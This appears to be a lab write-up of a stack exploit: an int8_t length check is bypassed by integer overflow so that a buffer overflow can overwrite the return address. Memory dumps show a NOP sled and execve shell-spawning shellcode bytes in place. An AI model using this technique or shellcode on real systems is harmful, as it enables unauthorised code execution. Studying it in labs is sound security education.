The vulnerability of the program is the variable int8_t size and it can be exploited by an integer overflow. Let size bigger than 128, int8_t size becomes a negative number. It will always pass the check of if (n == 0 || size > 128). Then we overflow the msg buffer to overwrite the return address. The buffer we inject consist of nops, shellcode and the return address. The return address is just the address of start of the msg. Therefore it will return back to msg to run the shellcode.

The address of &msg is 0xbffffb88
Before the exploit:
0xbffffb88:	0x00000001	0xb7fff938	0x00000000	0x00000000
0xbffffb98:	0x00000000	0xb7fd2000	0xbffffbee	0xbffffbef
0xbffffba8:	0x00000001	0xb7ec4269	0xbffffbef	0xbffffbee
0xbffffbb8:	0x00000000	0xb7ff3fdc	0xbffffc74	0x00000000
0xbffffbc8:	0x00000000	0xb7e5f043	0x0804828d	0x00000000
0xbffffbd8:	0x00c30000	0x00000001	0xbffffdbf	0x0000002f
0xbffffbe8:	0xbffffc3c	0xb7fd2000	0x08048590	0x080483c0
0xbffffbf8:	0x00000000	0x08048335	0xb7fd23e4	0x00000016
0xbffffc08:	0x0804a000	0x080485e2	0x00000002	0xbffffcd4
0xbffffc18:	0xbffffc38	0x0804857b	0xbffffdd7	0x00000000

After the exploit:
0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb98:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffba8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc8:	0x90909090	0x90909090	0x90909090	0xeb909090
0xbffffbd8:	0x76895e1f	0x88c03108	0x46890746	0x890bb00c
0xbffffbe8:	0x084e8df3	0xcd0c568d	0x89db3180	0x80cd40d8
0xbffffbf8:	0xffffdce8	0x69622fff	0x68732f6e	0x000000a7
0xbffffc08:	0x00000099	0x90909090	0x90909090	0x90909090
0xbffffc18:	0xbffffbb8	0xbffffbb8	0xbffffd0a	0x00000000